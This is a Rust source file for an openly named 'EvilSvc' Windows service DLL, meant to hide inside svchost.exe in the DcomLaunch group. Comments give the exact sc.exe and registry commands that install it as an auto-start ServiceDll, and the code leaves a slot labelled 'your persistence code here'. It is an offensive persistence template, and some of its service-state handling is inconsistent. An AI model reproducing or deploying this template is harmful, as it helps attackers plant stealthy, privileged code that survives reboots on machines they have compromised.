use std::sync::{Arc, Mutex};
use std::thread;
use std::ptr::null_mut;
use winapi::shared::minwindef::{DWORD, TRUE};
use winapi::shared::ntdef::LPWSTR;
use winapi::um::synchapi::{CreateEventW, WaitForSingleObject, SetEvent};
use winapi::um::winsvc::{
    SERVICE_CONTROL_STOP, SERVICE_CONTROL_SHUTDOWN, SERVICE_CONTROL_PAUSE, SERVICE_CONTROL_CONTINUE,
    SERVICE_CONTROL_INTERROGATE, SERVICE_RUNNING, SERVICE_STOPPED, SERVICE_START_PENDING,
    SERVICE_STATUS, SERVICE_STATUS_HANDLE, SetServiceStatus, RegisterServiceCtrlHandlerW,
};
use winapi::um::winnt::{HANDLE, PWSTR, SERVICE_WIN32_SHARE_PROCESS};
//sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto
//reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f
//HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\DcomLaunch
const SVCNAME: &str = "EvilSvc";

struct ServiceStatusHandle(SERVICE_STATUS_HANDLE);

unsafe impl Send for ServiceStatusHandle {}
unsafe impl Sync for ServiceStatusHandle {}

struct EventHandle(HANDLE);

unsafe impl Send for EventHandle {}
unsafe impl Sync for EventHandle {}

struct ServiceStatus {
    handle: ServiceStatusHandle,
    status: SERVICE_STATUS,
}

impl ServiceStatus {
    fn new(handle: SERVICE_STATUS_HANDLE) -> Self {
        ServiceStatus {
            handle: ServiceStatusHandle(handle),
            status: SERVICE_STATUS {
                dwServiceType: SERVICE_WIN32_SHARE_PROCESS,
                dwCurrentState: SERVICE_START_PENDING,
                dwControlsAccepted: 0,
                dwWin32ExitCode: 0,
                dwServiceSpecificExitCode: 0,
                dwCheckPoint: 0,
                dwWaitHint: 0,
            },
        }
    }

    fn update(&mut self, current_state: DWORD) {
        self.status.dwCurrentState = current_state;
        unsafe {
            SetServiceStatus(self.handle.0, &mut self.status);
        }
    }
}

lazy_static::lazy_static! {
    static ref STOP_EVENT: Arc<Mutex<EventHandle>> = Arc::new(Mutex::new(EventHandle(unsafe {
        CreateEventW(null_mut(), TRUE, 0, null_mut())
    })));
}

extern "system" fn service_handler(ctrl_code: DWORD) {
    match ctrl_code {
        SERVICE_CONTROL_STOP | SERVICE_CONTROL_SHUTDOWN => {
            // Handle stop or shutdown
            unsafe {
                SetEvent(STOP_EVENT.lock().unwrap().0);
            }
        },
        SERVICE_CONTROL_PAUSE => {
            // Handle pause
        },
        SERVICE_CONTROL_CONTINUE => {
            // Handle continue
        },
        SERVICE_CONTROL_INTERROGATE => {
            // Handle interrogate
        },
        _ => {
            // Handle other control codes
        },
    }
}

fn execute_service_code(service_status: Arc<Mutex<ServiceStatus>>, stop_event: Arc<Mutex<EventHandle>>) {
    service_status.lock().unwrap().update(SERVICE_RUNNING);

    // #####################################
    // your persistence code here
    // #####################################

    loop {
        unsafe {
            WaitForSingleObject(stop_event.lock().unwrap().0, winapi::um::winbase::INFINITE);
        }
        service_status.lock().unwrap().update(SERVICE_STOPPED);
        break;
    }
}

#[no_mangle]
pub extern "system" fn ServiceMain(_arg_c: DWORD, _arg_v: *mut LPWSTR) {
    let service_status = Arc::new(Mutex::new(ServiceStatus::new(unsafe {
        RegisterServiceCtrlHandlerW(
            SVCNAME.encode_utf16().collect::<Vec<u16>>().as_ptr() as PWSTR,
            Some(service_handler),
        )
    })));

    let stop_event = Arc::clone(&STOP_EVENT);

    let service_status_clone = Arc::clone(&service_status);
    thread::spawn(move || {
        execute_service_code(service_status_clone, stop_event);
    });

    service_status.lock().unwrap().update(SERVICE_START_PENDING);
}
